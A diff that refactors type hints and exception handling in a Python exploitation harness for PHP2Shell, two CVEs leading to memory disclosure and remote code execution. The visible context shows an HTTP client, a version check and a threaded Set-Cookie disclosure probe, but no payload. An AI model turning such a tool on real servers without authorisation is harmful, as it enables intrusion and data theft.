@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 php2shell_exploit.py — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) assessment
 and exploitation harness derived from docs/php2shell-analysis.md.
@@ -37,6 +36,7 @@ Authorized testing only.
 from __future__ import annotations
 
 import argparse
+import contextlib
 import ipaddress
 import json
 import random
@@ -49,7 +49,6 @@ import threading
 import time
 import urllib.parse
 from dataclasses import dataclass, field
-from typing import Dict, List, Optional, Tuple
 
 # ---------------------------------------------------------------------------
 # Fixed-release matrix (docs/php2shell-analysis.md, section 2)
@@ -105,7 +104,7 @@ class Target:
         self.base_path = p.path if p.path not in ("", "/") else "/"
         self.host_header = self.host if self.port in (80, 443) else f"{self.host}:{self.port}"
 
-    def connect(self, timeout: float = 10.0) -> "HTTPConn":
+    def connect(self, timeout: float = 10.0) -> HTTPConn:
         return HTTPConn(self, timeout)
 
 
@@ -126,14 +125,14 @@ class HTTPConn:
     def _fill(self) -> bool:
         try:
             chunk = self.sock.recv(65536)
-        except (socket.timeout, ConnectionResetError, OSError):
+        except (TimeoutError, ConnectionResetError, OSError):
             return False
         if not chunk:
             return False
         self.buf += chunk
         return True
 
-    def read_response(self, timeout: float = 8.0) -> Tuple[int, Dict[str, str], bytes, List[str]]:
+    def read_response(self, timeout: float = 8.0) -> tuple[int, dict[str, str], bytes, list[str]]:
         self.sock.settimeout(timeout)
         while b"\r\n\r\n" not in self.buf:
             if not self._fill():
@@ -149,8 +148,8 @@ class HTTPConn:
             except (IndexError, ValueError):
                 status = 0
 
-        headers: Dict[str, str] = {}
-        set_cookies: List[str] = []
+        headers: dict[str, str] = {}
+        set_cookies: list[str] = []
         for line in lines[1:]:
             if b":" not in line:
                 continue
@@ -201,14 +200,12 @@ class HTTPConn:
         return status, headers, body, set_cookies
 
     def close(self) -> None:
-        try:
+        with contextlib.suppress(OSError):
             self.sock.close()
-        except OSError:
-            pass
 
 
-def http_get(target: Target, path: str, extra: Optional[Dict[str, str]] = None,
-             timeout: float = 8.0) -> Tuple[int, Dict[str, str], bytes, List[str]]:
+def http_get(target: Target, path: str, extra: dict[str, str] | None = None,
+             timeout: float = 8.0) -> tuple[int, dict[str, str], bytes, list[str]]:
     conn = target.connect(timeout)
     headers = {
         "Host": target.host_header,
@@ -229,7 +226,7 @@ def http_get(target: Target, path: str, extra: Optional[Dict[str, str]] = None,
 # ---------------------------------------------------------------------------
 # Version classification
 # ---------------------------------------------------------------------------
-def classify_version(version: str) -> Tuple[str, bool, str]:
+def classify_version(version: str) -> tuple[str, bool, str]:
     m = re.search(r"(\d+)\.(\d+)\.(\d+)", version or "")
     if not m:
         return "UNKNOWN", False, "Could not extract a PHP version from the response headers."
@@ -280,9 +277,9 @@ class Report:
     oom_reached: bool = False
     oom_status: int = 0
     worker_alive: bool = False
-    disclosure: Optional[bytes] = None
-    pointers: List[int] = field(default_factory=list)
-    notes: List[str] = field(default_factory=list)
+    disclosure: bytes | None = None
+    pointers: list[int] = field(default_factory=list)
+    notes: list[str] = field(default_factory=list)
     rce_confirmed: bool = False
     rce_output: str = ""
 
@@ -463,7 +460,7 @@ def check_worker_survival(cfg: Config, rep: Report) -> None:
 # ---------------------------------------------------------------------------
 def probe_disclosure(cfg: Config, rep: Report) -> None:
     stage("5/5", "Memory disclosure via Set-Cookie (stale PS(id))")
-    results: Dict[int, bytes] = {}
+    results: dict[int, bytes] = {}
     lock = threading.Lock()
 
     def worker(i: int) -> None:
@@ -491,7 +488,7 @@ def probe_disclosure(cfg: Config, rep: Report) -> None:
     for t in threads:
         t.join()
 
-    suspicious: List[Tuple[int, bytes]] = []
+    suspicious: list[tuple[int, bytes]] = []
     for i, raw in sorted(results.items()):
         if not raw:
             continue
